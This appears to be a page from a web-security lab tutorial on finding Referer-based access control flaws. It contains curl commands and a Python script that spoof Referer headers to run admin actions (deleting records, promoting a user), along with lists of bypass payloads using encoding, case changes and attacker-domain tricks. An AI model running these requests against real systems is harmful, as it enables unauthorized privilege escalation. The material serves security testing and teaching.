<div class="doc-header">
    <h1>Testing Techniques</h1>
    <p>How to identify Referer-based access control vulnerabilities</p>
</div>

<div class="content-section">
    <h2>Identifying the Vulnerability</h2>
    
    <h3>Signs of Referer-Based Access Control</h3>
    <ul>
        <li>Admin functions fail when accessing directly via URL</li>
        <li>Error messages mention "Referer" or "Origin"</li>
        <li>Functions work when navigating from specific pages but not others</li>
        <li>Requests include Referer headers pointing to admin/privileged pages</li>
    </ul>
</div>

<div class="content-section">
    <h2>Testing Methodology</h2>
    
    <h3>Step 1: Map the Application</h3>
    <p>
        Identify all admin functions and their endpoints. Note which pages link to which 
        endpoints and what parameters are used.
    </p>
    
    <h3>Step 2: Test Direct Access</h3>
    <p>
        Try accessing admin endpoints directly without a Referer header:
    </p>
    
    <div class="code-block">
        <span class="code-label">Direct Access Test</span>
        <code># Remove Referer header entirely
curl "http://target.com/admin-action.php?action=delete&id=1" \
     -H "Cookie: session=your_session" \
     --no-referer

# Response indicates Referer-based check:
# "Unauthorized - Invalid Referer"</code>
    </div>
    
    <h3>Step 3: Test with Spoofed Referer</h3>
    <p>
        Add a Referer header pointing to an admin page:
    </p>
    
    <div class="code-block">
        <span class="code-label">Spoofed Referer Test</span>
        <code># Add Referer pointing to admin page
curl "http://target.com/admin-action.php?action=delete&id=1" \
     -H "Cookie: session=your_session" \
     -H "Referer: http://target.com/admin"

# If this succeeds, the app is vulnerable!</code>
    </div>
    
    <h3>Step 4: Test with Non-Admin Session</h3>
    <p>
        The crucial test: use a low-privileged user's session with a spoofed Referer:
    </p>
    
    <div class="code-block">
        <span class="code-label">Privilege Escalation Test</span>
        <code># Use non-admin session with admin Referer
curl "http://target.com/admin-action.php?action=promote&user=attacker" \
     -H "Cookie: session=non_admin_session" \
     -H "Referer: http://target.com/admin"

# Success here confirms the vulnerability!</code>
    </div>
</div>

<div class="content-section">
    <h2>Burp Suite Testing</h2>
    
    <h3>Using Burp Proxy</h3>
    <ol>
        <li>Capture a legitimate admin request</li>
        <li>Send it to Repeater</li>
        <li>Remove the Referer header and send - observe the response</li>
        <li>Add a spoofed Referer header and send - observe if it succeeds</li>
        <li>Replace the session cookie with a non-admin user's cookie</li>
        <li>Send again - if it succeeds, the vulnerability is confirmed</li>
    </ol>
    
    <h3>Using Burp Intruder</h3>
    <p>
        Test multiple endpoints with various Referer values:
    </p>
    
    <div class="code-block">
        <span class="code-label">Intruder Payloads</span>
        <code># Referer header payloads to test:
http://target.com/admin
http://target.com/admin.php
http://target.com/admin/dashboard
http://target.com/administrator
/admin
admin
http://attacker.com/admin  # Test if domain is validated</code>
    </div>
</div>

<div class="content-section">
    <h2>Automated Testing</h2>
    
    <h3>Python Script</h3>
    
    <div class="code-block">
        <span class="code-label">Python Test Script</span>
        <code>import requests

base_url = "http://localhost/AC/lab13"
admin_endpoint = f"{base_url}/admin-roles.php"

# Your non-admin session cookie
cookies = {"PHPSESSID": "your_session_id"}

# Test without Referer
print("Test 1: Without Referer header")
r = requests.get(
    f"{admin_endpoint}?username=test&action=upgrade",
    cookies=cookies
)
print(f"Status: {r.status_code}, Response: {r.text[:100]}")

# Test with spoofed Referer
print("\nTest 2: With spoofed Referer")
r = requests.get(
    f"{admin_endpoint}?username=test&action=upgrade",
    cookies=cookies,
    headers={"Referer": f"{base_url}/admin"}
)
print(f"Status: {r.status_code}, Response: {r.text[:100]}")

if r.status_code == 200 and "Unauthorized" not in r.text:
    print("\n[VULNERABLE] Referer-based access control detected!")</code>
    </div>
</div>

<div class="content-section">
    <h2>Common Bypass Techniques</h2>
    
    <h3>1. Partial String Match</h3>
    <p>
        If the check only looks for a substring, try various ways to include it:
    </p>
    
    <div class="code-block">
        <span class="code-label">Substring Bypass</span>
        <code># If checking for '/admin' substring:
Referer: http://target.com/admin
Referer: http://target.com/anything?admin=1
Referer: http://target.com/adminx
Referer: http://attacker.com/admin  # Your own domain!</code>
    </div>
    
    <h3>2. URL Encoding</h3>
    <p>
        Try URL-encoded versions:
    </p>
    
    <div class="code-block">
        <span class="code-label">URL Encoding Bypass</span>
        <code>Referer: http://target.com/%61dmin  # %61 = 'a'
Referer: http://target.com/admin%00  # Null byte</code>
    </div>
    
    <h3>3. Case Sensitivity</h3>
    <p>
        Test if the check is case-sensitive:
    </p>
    
    <div class="code-block">
        <span class="code-label">Case Bypass</span>
        <code>Referer: http://target.com/ADMIN
Referer: http://target.com/Admin
Referer: http://target.com/AdMiN</code>
    </div>
    
    <h3>4. Alternative Origins</h3>
    <p>
        If the application checks the domain, test for bypasses:
    </p>
    
    <div class="code-block">
        <span class="code-label">Domain Bypass</span>
        <code>Referer: http://target.com.attacker.com/admin
Referer: http://attacker.target.com/admin
Referer: http://target.com@attacker.com/admin</code>
    </div>
</div>

<div class="content-section">
    <h2>Testing Checklist</h2>
    
    <div class="info-box info">
        <h4>📋 Quick Reference</h4>
        <ul style="color: #ccc; margin-top: 0.5rem;">
            <li>☐ Test endpoint without Referer header</li>
            <li>☐ Test with spoofed admin Referer</li>
            <li>☐ Test with non-admin session + spoofed Referer</li>
            <li>☐ Try partial/substring matches</li>
            <li>☐ Try URL encoding variations</li>
            <li>☐ Try case variations</li>
            <li>☐ Try external domains with admin path</li>
            <li>☐ Document all findings</li>
        </ul>
    </div>
</div>
